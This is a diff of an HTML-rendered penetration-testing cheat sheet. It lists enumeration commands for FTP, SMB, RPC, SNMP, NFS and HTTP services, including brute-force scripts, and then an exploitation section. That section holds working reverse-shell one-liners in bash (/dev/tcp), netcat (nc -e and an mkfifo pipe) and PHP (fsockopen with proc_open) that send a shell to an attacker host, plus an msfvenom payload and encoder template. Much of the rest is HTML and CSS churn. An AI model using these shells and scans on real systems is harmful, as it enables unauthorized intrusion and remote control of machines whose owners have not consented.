@@ -1,322 +1,122 @@
-<!DOCTYPE html><html><head>
-      <title>methodology</title>
-      <meta charset="utf-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      
-      <link rel="stylesheet" href="file:////home/neuieugh/.vscode/extensions/shd101wyy.markdown-preview-enhanced-0.5.3/node_modules/@shd101wyy/mume/dependencies/katex/katex.min.css">
-      
-      
+<h1 class="code-line" data-line-start=0 data-line-end=1 ><a id="1_Enumeration_0"></a>1. Enumeration</h1>
+<h2 class="code-line" data-line-start=1 data-line-end=2 ><a id="Intital_Scanning_1"></a>Intital Scanning</h2>
+<p class="has-line-data" data-line-start="2" data-line-end="3">First run an asynchronous port scan on the box to find the ports of interest.</p>
+<pre><code class="has-line-data" data-line-start="5" data-line-end="11" class="language-bash"><span class="hljs-comment"># Standard</span>
+unicornscan <span class="hljs-variable">$RHOST</span>
 
-      
-      
-      
-      
-      
-      
-      
+<span class="hljs-comment"># Full Range</span>
+unicornscan <span class="hljs-variable">$RHOST</span>:<span class="hljs-number">0</span>-<span class="hljs-number">65535</span>
+</code></pre>
+<p class="has-line-data" data-line-start="12" data-line-end="13">Second, run a slower, synchronous scans with scripts.</p>
+<h2 class="code-line" data-line-start=14 data-line-end=15 ><a id="Port_21__FTP_14"></a>Port 21 - FTP</h2>
+<pre><code class="has-line-data" data-line-start="16" data-line-end="24" class="language-bash">ftp <span class="hljs-variable">$RHOST</span>
 
-      <style>
-      /**
- * prism.js Github theme based on GitHub's theme.
- * @author Sam Clarke
- */
-code[class*="language-"],
-pre[class*="language-"] {
-  color: #333;
-  background: none;
-  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
-  text-align: left;
-  white-space: pre;
-  word-spacing: normal;
-  word-break: normal;
-  word-wrap: normal;
-  line-height: 1.4;
+<span class="hljs-comment"># Anonymous login</span>
+nmap --script=ftp-anon -p <span class="hljs-number">21</span> <span class="hljs-variable">$RHOST</span>
 
-  -moz-tab-size: 8;
-  -o-tab-size: 8;
-  tab-size: 8;
+<span class="hljs-comment"># Bruteforce logins</span>
+nmap --script=ftp-brute -p <span class="hljs-number">21</span> <span class="hljs-variable">$RHOST</span>
+</code></pre>
+<h2 class="code-line" data-line-start=25 data-line-end=26 ><a id="Port_25__SMTP_25"></a>Port 25 - SMTP</h2>
+<pre><code class="has-line-data" data-line-start="27" data-line-end="29" class="language-bash">nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-<span class="hljs-number">4344</span>, smtp-vuln-cve2011-<span class="hljs-number">1720</span>,smtp-vuln-cve2011-<span class="hljs-number">1764</span> -p <span class="hljs-number">25</span> <span class="hljs-variable">$RHOST</span>
+</code></pre>
+<h2 class="code-line" data-line-start=30 data-line-end=31 ><a id="Port_80__HTTP_30"></a>Port 80 - HTTP</h2>
+<pre><code class="has-line-data" data-line-start="33" data-line-end="39" class="language-bash">nikto <span class="hljs-variable">$RHOST</span>
 
-  -webkit-hyphens: none;
-  -moz-hyphens: none;
-  -ms-hyphens: none;
-  hyphens: none;
-}
-
-/* Code blocks */
-pre[class*="language-"] {
-  padding: .8em;
-  overflow: auto;
-  /* border: 1px solid #ddd; */
-  border-radius: 3px;
-  /* background: #fff; */
-  background: #f5f5f5;
-}
-
-/* Inline code */
-:not(pre) > code[class*="language-"] {
-  padding: .1em;
-  border-radius: .3em;
-  white-space: normal;
-  background: #f5f5f5;
-}
-
-.token.comment,
-.token.blockquote {
-  color: #969896;
-}
-
-.token.cdata {
-  color: #183691;
-}
-
-.token.doctype,
-.token.punctuation,
-.token.variable,
-.token.macro.property {
-  color: #333;
-}
-
-.token.operator,
-.token.important,
-.token.keyword,
-.token.rule,
-.token.builtin {
-  color: #a71d5d;
-}
-
-.token.string,
-.token.url,
-.token.regex,
-.token.attr-value {
-  color: #183691;
-}
-
-.token.property,
-.token.number,
-.token.boolean,
-.token.entity,
-.token.atrule,
-.token.constant,
-.token.symbol,
-.token.command,
-.token.code {
-  color: #0086b3;
-}
-
-.token.tag,
-.token.selector,
-.token.prolog {
-  color: #63a35c;
-}
-
-.token.function,
-.token.namespace,
-.token.pseudo-element,
-.token.class,
-.token.class-name,
-.token.pseudo-class,
-.token.id,
-.token.url-reference .token.variable,
-.token.attr-name {
-  color: #795da3;
-}
-
-.token.entity {
-  cursor: help;
-}
-
-.token.title,
-.token.title .token.punctuation {
-  font-weight: bold;
-  color: #1d3e81;
-}
-
-.token.list {
-  color: #ed6a43;
-}
-
-.token.inserted {
-  background-color: #eaffea;
-  color: #55a532;
-}
-
-.token.deleted {
-  background-color: #ffecec;
-  color: #bd2c00;
-}
-
-.token.bold {
-  font-weight: bold;
-}
-
-.token.italic {
-  font-style: italic;
-}
-
-
-/* JSON */
-.language-json .token.property {
-  color: #183691;
-}
-
-.language-markup .token.tag .token.punctuation {
-  color: #333;
-}
-
-/* CSS */
-code.language-css,
-.language-css .token.function {
-  color: #0086b3;
-}
-
-/* YAML */
-.language-yaml .token.atrule {
-  color: #63a35c;
-}
-
-code.language-yaml {
-  color: #183691;
-}
-
-/* Ruby */
-.language-ruby .token.function {
-  color: #333;
-}
-
-/* Markdown */
-.language-markdown .token.url {
-  color: #795da3;
-}
-
-/* Makefile */
-.language-makefile .token.symbol {
-  color: #795da3;
-}
-
-.language-makefile .token.variable {
-  color: #183691;
-}
-
-.language-makefile .token.builtin {
-  color: #0086b3;
-}
-
-/* Bash */
-.language-bash .token.keyword {
-  color: #0086b3;
-}
-
-/* highlight */
-pre[data-line] {
-  position: relative;
-  padding: 1em 0 1em 3em;
-}
-pre[data-line] .line-highlight-wrapper {
-  position: absolute;
-  top: 0;
-  left: 0;
-  background-color: transparent;
-  display: block;
-  width: 100%;
-}
-
-pre[data-line] .line-highlight {
-  position: absolute;
-  left: 0;
-  right: 0;
-  padding: inherit 0;
-  margin-top: 1em;
-  background: hsla(24, 20%, 50%,.08);
-  background: linear-gradient(to right, hsla(24, 20%, 50%,.1) 70%, hsla(24, 20%, 50%,0));
-  pointer-events: none;
-  line-height: inherit;
-  white-space: pre;
-}
-
-pre[data-line] .line-highlight:before, 
-pre[data-line] .line-highlight[data-end]:after {
-  content: attr(data-start);
-  position: absolute;
-  top: .4em;
-  left: .6em;
-  min-width: 1em;
-  padding: 0 .5em;
-  background-color: hsla(24, 20%, 50%,.4);
-  color: hsl(24, 20%, 95%);
-  font: bold 65%/1.5 sans-serif;
-  text-align: center;
-  vertical-align: .3em;
-  border-radius: 999px;
-  text-shadow: none;
-  box-shadow: 0 1px white;
-}
-
-pre[data-line] .line-highlight[data-end]:after {
-  content: attr(data-end);
-  top: auto;
-  bottom: .4em;
-}html body{font-family:"Helvetica Neue",Helvetica,"Segoe UI",Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ul,html body>ol{margin-bottom:16px}html body ul,html body ol{padding-left:2em}html body ul.no-list,html body ol.no-list{padding:0;list-style-type:none}html body ul ul,html body ul ol,html body ol ol,html body ol ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:bold;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:bold}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em !important;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::before,html body code::after{letter-spacing:-0.2em;content:"\00a0"}html body pre>code{padding:0;margin:0;font-size:.85em !important;word-break:normal;white-space:pre;background:transparent;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;font-size:.85em !important;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:before,html body pre tt:before,html body pre code:after,html body pre tt:after{content:normal}html body p,html body blockquote,html body ul,html body ol,html body dl,html body pre{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body pre,html body code{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview .pagebreak,.markdown-preview .newpage{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center !important}.markdown-preview:not([for="preview"]) .code-chunk .btn-group{display:none}.markdown-preview:not([for="preview"]) .code-chunk .status{display:none}.markdown-preview:not([for="preview"]) .code-chunk .output-div{margin-bottom:16px}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0}@media screen and (min-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{font-size:14px !important;padding:1em}}@media print{html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,0.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{padding:0 1.6em;margin-top:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc li{margin-bottom:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{list-style-type:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% -  300px);padding:2em calc(50% - 457px -  150px);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
-/* Please visit the URL below for more information: */
-/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */
-
-      </style>
-    </head>
-    <body for="html-export">
-      <div class="mume markdown-preview  ">
-      <h1 class="mume-header" id="1-enumeration">1. Enumeration</h1>
-
-<h2 class="mume-header" id="intital-scanning">Intital Scanning</h2>
-
-<p>First run an asynchronous port scan on the box to find the ports of interest.</p>
-<pre data-role="codeBlock" data-info="bash" class="language-bash"><span class="token comment"># Standard</span>
-unicornscan <span class="token variable">$RHOST</span>
-
-<span class="token comment"># Full Range</span>
-unicornscan <span class="token variable">$RHOST</span>:0-65535
-</pre><p>Second, run a slower, synchronous scans with scripts.</p>
-<h2 class="mume-header" id="port-21-ftp">Port 21 - FTP</h2>
-
-<pre data-role="codeBlock" data-info="bash" class="language-bash"><span class="token comment"># Anonymous login</span>
-nmap --script<span class="token operator">=</span>ftp-anon -p 21 <span class="token variable">$RHOST</span>
-
-<span class="token comment"># Bruteforce logins</span>
-nmap --script<span class="token operator">=</span>ftp-brute -p 21 <span class="token variable">$RHOST</span>
-</pre><h2 class="mume-header" id="port-80-http">Port 80 - HTTP</h2>
-
-<pre data-role="codeBlock" data-info="bash" class="language-bash">nikto <span class="token variable">$RHOST</span>
-
-<span class="token function">curl</span> <span class="token variable">$RHOST</span>/robots.txt
+curl <span class="hljs-variable">$RHOST</span>/robots.txt
 
 dirbuster
-</pre><h4 class="mume-header" id="wordpress">Wordpress</h4>
+</code></pre>
+<h4 class="code-line" data-line-start=39 data-line-end=40 ><a id="Wordpress_39"></a>Wordpress</h4>
+<pre><code class="has-line-data" data-line-start="41" data-line-end="45" class="language-bash">nmap --script=http-wordpress* -p <span class="hljs-number">80</span> <span class="hljs-variable">$RHOST</span>
 
-<pre data-role="codeBlock" data-info="bash" class="language-bash">nmap --script<span class="token operator">=</span>http-wordpress* -p 80 <span class="token variable">$RHOST</span>
+wpscan <span class="hljs-variable">$RHOST</span>
+</code></pre>
+<h2 class="code-line" data-line-start=46 data-line-end=47 ><a id="Port_110__POP3_46"></a>Port 110 - POP3</h2>
+<pre><code class="has-line-data" data-line-start="48" data-line-end="55" class="language-bash">telnet <span class="hljs-variable">$RHOST</span> <span class="hljs-number">110</span>
+    USER <span class="hljs-variable">$USER</span>
+    PASS <span class="hljs-variable">$PASS</span>
+    LIST
+    RETR
+    QUIT
+</code></pre>
+<h2 class="code-line" data-line-start=56 data-line-end=57 ><a id="Port_111__RPCBind_56"></a>Port 111 - RPCBind</h2>
+<pre><code class="has-line-data" data-line-start="58" data-line-end="70" class="language-bash"><span class="hljs-comment"># List of services running RPC</span>
+<span class="hljs-comment"># RPC can help find NFS-shares</span>
+rpcbind -p <span class="hljs-variable">$RHOST</span>
 
-wpscan <span class="token variable">$RHOST</span>
-</pre><h2 class="mume-header" id="port-139445-smb">Port 139/445 - SMB</h2>
+rpcclient -U <span class="hljs-string">""</span> <span class="hljs-variable">$RHOST</span>
+    srvinfo
+    enumdomusers
+    getdompwinfo
+    querydominfo
+    netshareenum
+    netshareenumall
+</code></pre>
+<h2 class="code-line" data-line-start=71 data-line-end=72 ><a id="Port_135__MSRPC_71"></a>Port 135 - MSRPC</h2>
+<pre><code class="has-line-data" data-line-start="73" data-line-end="84" class="language-bash"><span class="hljs-comment"># Micro$oft RPC port</span>
+nmap <span class="hljs-number">192.168</span>.<span class="hljs-number">0.101</span> --script=msrpc-enum
 
-<pre data-role="codeBlock" data-info="bash" class="language-bash">enum4linux <span class="token punctuation">[</span>-u username<span class="token punctuation">]</span><span class="token punctuation">[</span>-p password<span class="token punctuation">]</span> <span class="token variable">$RHOST</span>
+rpcclient -U <span class="hljs-string">""</span> <span class="hljs-variable">$RHOST</span>
+    srvinfo
+    enumdomusers
+    getdompwinfo
+    querydominfo
+    netshareenum
+    netshareenumall
+</code></pre>
+<h2 class="code-line" data-line-start=85 data-line-end=86 ><a id="Port_139445__SMB_85"></a>Port 139/445 - SMB</h2>
+<pre><code class="has-line-data" data-line-start="87" data-line-end="108" class="language-bash">enum4linux [-u <span class="hljs-variable">$USER</span>][-p <span class="hljs-variable">$PASS</span>] <span class="hljs-variable">$RHOST</span>
 
-smbmap <span class="token punctuation">[</span>-u username<span class="token punctuation">]</span><span class="token punctuation">[</span>-p password<span class="token punctuation">]</span> <span class="token variable">$RHOST</span>
+smbmap [-u <span class="hljs-variable">$USER</span>][-p <span class="hljs-variable">$PASS</span>] -H <span class="hljs-variable">$RHOST</span>
 
-<span class="token comment"># Info dump</span>
-nmap --script<span class="token operator">=</span>smb-enum*.nse -p 139,445 <span class="token variable">$RHOST</span>
+smbclient -L \\\\<span class="hljs-variable">$RHOST</span>\\<span class="hljs-variable">$SHARE</span> [-U <span class="hljs-variable">$USER</span>] [<span class="hljs-variable">$PASS</span>]
 
-<span class="token comment"># OS discovery</span>
-nmap --script<span class="token operator">=</span>smb-os-discovery.nse -p 139,445 <span class="token variable">$RHOST</span>
+<span class="hljs-comment"># Find NetBIOS info</span>
+nmblookup -A <span class="hljs-variable">$RHOST</span>
 
-<span class="token comment"># Scan for known vulnerabilties</span>
-nmap --script<span class="token operator">=</span>smb-vuln* -p 139,445 <span class="token variable">$RHOST</span>
-</pre><h1 class="mume-header" id="2-exploitation">2. Exploitation</h1>
+rpcclient -U <span class="hljs-string">""</span> -N <span class="hljs-variable">$RHOST</span>
+    enumdomusers
 
-<h2 class="mume-header" id="msfvenom-reverse-shell-payloads">MSFVenom Reverse Shell Payloads</h2>
+<span class="hljs-comment"># Info dump</span>
+nmap --script=smb-enum*.nse -p <span class="hljs-number">139</span>,<span class="hljs-number">445</span> <span class="hljs-variable">$RHOST</span>
 
-<h3 class="mume-header" id="generate-payloads">Generate Payloads</h3>
+<span class="hljs-comment"># OS discovery</span>
+nmap --script=smb-os-discovery.nse -p <span class="hljs-number">139</span>,<span class="hljs-number">445</span> <span class="hljs-variable">$RHOST</span>
 
-<pre data-role="codeBlock" data-info="bash" class="language-bash">msfvenom -p <span class="token variable">$PAYLOAD</span> LHOST<span class="token operator">=</span><span class="token variable">$LHOST</span> LPORT<span class="token operator">=</span><span class="token variable">$LPORT</span> <span class="token punctuation">[</span>-e <span class="token variable">$ENCODER</span> <span class="token punctuation">[</span>-i <span class="token variable">$ROUNDS</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>-b <span class="token variable">$BADCHARS</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>-f <span class="token variable">$FORMAT</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>-o <span class="token variable">$FILENMAE</span><span class="token punctuation">]</span>
-</pre><h3 class="mume-header" id="payloads">Payloads</h3>
+<span class="hljs-comment"># Scan for known vulnerabilties</span>
+nmap --script=smb-vuln* -p <span class="hljs-number">139</span>,<span class="hljs-number">445</span> <span class="hljs-variable">$RHOST</span>
+</code></pre>
+<h2 class="code-line" data-line-start=109 data-line-end=110 ><a id="Port_161__SNMP_109"></a>Port 161 - SNMP</h2>
+<pre><code class="has-line-data" data-line-start="111" data-line-end="119" class="language-bash">snmpwalk -c public -v1 <span class="hljs-variable">$RHOST</span>
 
-<table>
+snmpcheck -t <span class="hljs-variable">$RHOST</span> -c public
+
+onesixtyone -c <span class="hljs-variable">$NAMES_FILE</span> -i <span class="hljs-variable">$RHOST_FILE</span>
+
+snmpenum -t <span class="hljs-variable">$RHOST</span>
+</code></pre>
+<h2 class="code-line" data-line-start=120 data-line-end=121 ><a id="Port_443__HTTPS_120"></a>Port 443 - HTTPS</h2>
+<pre><code class="has-line-data" data-line-start="122" data-line-end="124" class="language-bash">nmap <span class="hljs-operator">-s</span>V --script=ssl-heartbleed <span class="hljs-variable">$RHOST</span>
+</code></pre>
+<h2 class="code-line" data-line-start=125 data-line-end=126 ><a id="Port_2049__NFS_125"></a>Port 2049 - NFS</h2>
+<pre><code class="has-line-data" data-line-start="127" data-line-end="134" class="language-bash"><span class="hljs-comment"># Enumeration</span>
+showmount <span class="hljs-operator">-e</span> <span class="hljs-variable">$RHOST</span>
+
+<span class="hljs-comment"># Mounting</span>
+mount <span class="hljs-variable">$RHOST</span>:/ /tmp/NFS
+mount -t <span class="hljs-variable">$RHOST</span>:/ /tmp/NFS
+</code></pre>
+<h2 class="code-line" data-line-start=135 data-line-end=136 ><a id="Port_5900__VNC_135"></a>Port 5900 - VNC</h2>
+<pre><code class="has-line-data" data-line-start="137" data-line-end="139" class="language-bash">vncviewer <span class="hljs-variable">$RHOST</span>
+</code></pre>
+<h1 class="code-line" data-line-start=140 data-line-end=141 ><a id="2_Exploitation_140"></a>2. Exploitation</h1>
+<h2 class="code-line" data-line-start=141 data-line-end=142 ><a id="MSFVenom_Reverse_Shell_Payloads_141"></a>MSFVenom Reverse Shell Payloads</h2>
+<h3 class="code-line" data-line-start=142 data-line-end=143 ><a id="Generate_Payloads_142"></a>Generate Payloads</h3>
+<pre><code class="has-line-data" data-line-start="145" data-line-end="147" class="language-bash">msfvenom -p <span class="hljs-variable">$PAYLOAD</span> LHOST=<span class="hljs-variable">$LHOST</span> LPORT=<span class="hljs-variable">$LPORT</span> [<span class="hljs-operator">-e</span> <span class="hljs-variable">$ENCODER</span> [-i <span class="hljs-variable">$ROUNDS</span>]] [-b <span class="hljs-variable">$BADCHARS</span>] [<span class="hljs-operator">-f</span> <span class="hljs-variable">$FORMAT</span>] [-o <span class="hljs-variable">$FILENMAE</span>]
+</code></pre>
+<h3 class="code-line" data-line-start=148 data-line-end=149 ><a id="Payloads_148"></a>Payloads</h3>
+<table class="table table-striped table-bordered">
 <thead>
 <tr>
 <th style="text-align:left">Windows</th>
@@ -334,7 +134,7 @@ nmap --script<span class="token operator">=</span>smb-vuln* -p 139,445 <span cla
 </tr>
 </tbody>
 </table>
-<table>
+<table class="table table-striped table-bordered">
 <thead>
 <tr>
 <th style="text-align:left">Linux</th>
@@ -352,128 +152,121 @@ nmap --script<span class="token operator">=</span>smb-vuln* -p 139,445 <span cla
 </tr>
 </tbody>
 </table>
-<h4 class="mume-header" id="encoders">Encoders</h4>
-
-<p><code>x86/shikata_ga_nai</code></p>
-<h2 class="mume-header" id="bash-reverse-shells">Bash Reverse Shells</h2>
-
-<pre data-role="codeBlock" data-info="bash" class="language-bash">0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>196<span class="token punctuation">;</span><span class="token function">exec</span> 196<span class="token operator">&lt;</span><span class="token operator">&gt;</span>/dev/tcp/<span class="token variable">$LHOST</span>/<span class="token variable">$LPORT</span><span class="token punctuation">;</span> sh <span class="token operator">&lt;</span><span class="token operator">&amp;</span>196 <span class="token operator">&gt;</span><span class="token operator">&amp;</span>196 2<span class="token operator">&gt;</span><span class="token operator">&amp;</span>196
-</pre><pre data-role="codeBlock" data-info="bash" class="language-bash"><span class="token function">bash</span> -i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> /dev/tcp/<span class="token variable">$LHOST</span>/<span class="token variable">$LPORT</span> 0<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1
-</pre><h2 class="mume-header" id="php-reverse-shells">PHP Reverse Shells</h2>
-
-<h3 class="mume-header" id="one-liner">One Liner</h3>
-
-<pre data-role="codeBlock" data-info="php" class="language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$sock</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$LHOST</span><span class="token punctuation">,</span><span class="token variable">$LPORT</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$proc</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;/bin/sh -i&quot;</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span> <span class="token delimiter important">?&gt;</span>
-</pre><h3 class="mume-header" id="file-upload">File Upload</h3>
-
-<p>Kali File Location: <code>/usr/share/webshells/php/php-reverse-shell.php</code> <sup><sub>[<a href="files/php-reverse-shell.php">archive</a>]</sub></sup></p>
-<h2 class="mume-header" id="netcat-reverse-shells">Netcat Reverse Shells</h2>
-
-<h3 class="mume-header" id="unix">Unix</h3>
-
-<pre data-role="codeBlock" data-info="bash" class="language-bash"><span class="token function">nc</span> -e /bin/sh <span class="token variable">$LHOST</span> <span class="token variable">$LPORT</span>
-</pre><h3 class="mume-header" id="openbsd">OpenBSD</h3>
-
-<pre data-role="codeBlock" data-info="bash" class="language-bash"><span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/bash -i 2<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1<span class="token operator">|</span><span class="token function">nc</span> <span class="token variable">$LHOST</span> <span class="token variable">$PORT</span> <span class="token operator">&gt;</span>/tmp/f
-</pre><h1 class="mume-header" id="3-post-exploitation">3. Post-Exploitation</h1>
-
-<h2 class="mume-header" id="linux">Linux</h2>
-
-<h3 class="mume-header" id="enumeration-scripts">Enumeration Scripts:</h3>
-
+<h4 class="code-line" data-line-start=159 data-line-end=160 ><a id="Encoders_159"></a>Encoders</h4>
+<p class="has-line-data" data-line-start="160" data-line-end="161"><code>x86/shikata_ga_nai</code></p>
+<h2 class="code-line" data-line-start=162 data-line-end=163 ><a id="Bash_Reverse_Shells_162"></a>Bash Reverse Shells</h2>
+<pre><code class="has-line-data" data-line-start="164" data-line-end="166" class="language-bash"><span class="hljs-number">0</span>&lt;&amp;<span class="hljs-number">196</span>;<span class="hljs-built_in">exec</span> <span class="hljs-number">196</span>&lt;&gt;/dev/tcp/<span class="hljs-variable">$LHOST</span>/<span class="hljs-variable">$LPORT</span>; sh &lt;&amp;<span class="hljs-number">196</span> &gt;&amp;<span class="hljs-number">196</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">196</span>
+</code></pre>
+<pre><code class="has-line-data" data-line-start="167" data-line-end="169" class="language-bash">bash -i &gt;&amp; /dev/tcp/<span class="hljs-variable">$LHOST</span>/<span class="hljs-variable">$LPORT</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>
+</code></pre>
+<h2 class="code-line" data-line-start=170 data-line-end=171 ><a id="PHP_Reverse_Shells_170"></a>PHP Reverse Shells</h2>
+<h3 class="code-line" data-line-start=171 data-line-end=172 ><a id="One_Liner_171"></a>One Liner</h3>
+<pre><code class="has-line-data" data-line-start="173" data-line-end="175" class="language-php"><span class="hljs-preprocessor">&lt;?php</span> <span class="hljs-variable">$sock</span> = fsockopen(<span class="hljs-variable">$LHOST</span>,<span class="hljs-variable">$LPORT</span>); <span class="hljs-variable">$proc</span> = proc_open(<span class="hljs-string">"/bin/sh -i"</span>, <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>=&gt;<span class="hljs-variable">$sock</span>, <span class="hljs-number">1</span>=&gt;<span class="hljs-variable">$sock</span>, <span class="hljs-number">2</span>=&gt;<span class="hljs-variable">$sock</span>), <span class="hljs-variable">$pipes</span>) <span class="hljs-preprocessor">?&gt;</span>
+</code></pre>
